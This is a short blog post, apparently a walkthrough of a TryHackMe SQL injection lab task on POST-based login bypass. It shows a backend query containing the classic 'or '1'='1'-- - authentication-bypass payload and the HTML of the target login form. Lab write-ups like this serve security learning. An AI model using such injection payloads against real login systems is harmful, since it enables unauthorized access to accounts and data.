---
author: "Thao"
title: "My first hacking challenge CHAP.3: SQL Injection - POST Injection "

date: "2023-03-15"
summary: "In the second task, participants will work with an input box string, while the third task focuses on URL Injection. These challenges are designed to test our knowledge and problem-solving abilities in various cybersecurity scenarios. By completing these challenges, participants can gain valuable experience and insights into how to identify and mitigate security risks in real-world situations."
tags: [
    "sql",
    "hacking",
    "My-first-hacking-challenge",
]
toc: false
thumbnail: "https://www.thesslstore.com/blog/wp-content/uploads/2022/05/xml-injection-attack-feature.jpg"
---

Welcome back to my post with the third chap about SQL Injection challenge on tryhackme.

## Third chap - fourth task
1. Environment Setup.

[Check at chap 1](https://whatisthaodoing.today/post/my-first-hacking-challenge-sql-injection-chap.1/)

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1' or '1'='1'-- -' AND password='a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
```

<img src="/sql-injection-img/p2/Challenge-room-all-task-4.png" width="100%"/>

task 4

```html
<form action="/sesqli4/login" onsubmit="return validateform()" name="inputForm" method="POST">
        <h2 class="text-center">Log in</h2>
        <div class="form-group">
            <input type="text" class="form-control" placeholder="ProfileID" required="required" name="profileID">
        </div>
        <div class="form-group">
            <input type="password" class="form-control" placeholder="Password" required="required" name="password">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Log in</button>
        </div>
    </form>
```

